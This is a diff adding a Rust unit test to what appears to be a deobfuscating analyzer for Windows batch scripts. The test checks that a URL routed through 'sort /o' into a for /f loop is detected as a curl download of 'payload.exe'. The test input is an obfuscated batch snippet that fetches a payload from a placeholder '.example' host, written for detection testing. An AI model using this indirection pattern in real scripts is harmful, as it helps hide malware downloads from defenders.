@@ -3829,6 +3829,30 @@ for /f "tokens=* delims=" %%U in ('sort urls.txt ^| find "https://"') do curl -o
     }
 
     #[test]
+    fn sort_output_file_feeds_later_for_f_source() {
+        let report = analyze(
+            br#"echo zzz>urls.txt
+echo https://sort-output-file.example/payload.exe>>urls.txt
+sort urls.txt /o sorted.txt
+for /f "tokens=* delims=" %%U in ('type sorted.txt ^| find "https://"') do curl -o payload.exe %%U"#,
+            &Config::default(),
+        );
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Download { src, dst: Some(dst), .. }
+                        if src == "https://sort-output-file.example/payload.exe"
+                            && dst == "payload.exe"
+                )
+            }),
+            "sort /o output file did not feed later curl: {:?}\n{}",
+            report.traits,
+            report.deobfuscated
+        );
+    }
+
+    #[test]
     fn for_f_dir_b_discovers_generated_file_source() {
         let report = analyze(
             br#"echo https://for-f-dir-b.example/payload.exe>url.txt
